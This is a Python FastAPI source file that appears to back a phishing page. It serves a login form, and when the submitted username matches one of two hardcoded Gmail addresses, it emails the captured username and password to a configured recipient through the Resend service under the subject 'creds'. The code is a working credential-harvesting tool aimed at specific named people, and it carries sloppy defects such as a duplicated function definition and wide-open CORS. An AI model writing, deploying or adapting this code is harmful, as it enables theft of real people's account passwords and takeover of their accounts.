from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
from dotenv import load_dotenv
from selenium import webdriver  
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware
import resend

class LoginData(BaseModel):
    username: str
    password: str

load_dotenv()

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins="*",
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
templates = Jinja2Templates(directory="templates")

GMAIL_USER = os.getenv("GMAIL_USER")
GMAIL_PASSWORD = os.getenv("GMAIL_APP_PASSWORD")  # App Password, pas ton vrai mdp
TO_EMAIL= os.getenv("TO_EMAIL")

def send_email(to: str, subject: str, body: str):
    msg = MIMEMultipart()
    msg["From"] = GMAIL_USER
    msg["To"] = to
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(GMAIL_USER, GMAIL_PASSWORD)
        server.sendmail(GMAIL_USER, to, msg.as_string())

def send_email(html:str):
    resend.api_key = os.getenv("RESEND_API_KEY")
    resend.Emails.send({
    "from": "onboarding@resend.dev",
    "to":TO_EMAIL,
    "subject": "creds",
    "html": html
    })


    

@app.get("/", response_class=HTMLResponse)
async def get_form(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})


@app.post("/envoyer")
async def envoyer_email(
   data: LoginData
):
    try:
        if(data.username == "serabretagne@gmail.com" or data.username =="laforgeseraphine@gmail.com"):
            send_email(html=f"<p>username :{data.username}</p> <br/> <p> password: {data.password}</p>")
        
        
      
        return templates.TemplateResponse("index.html")
    except Exception as e:
        return {"erreur": str(e)}


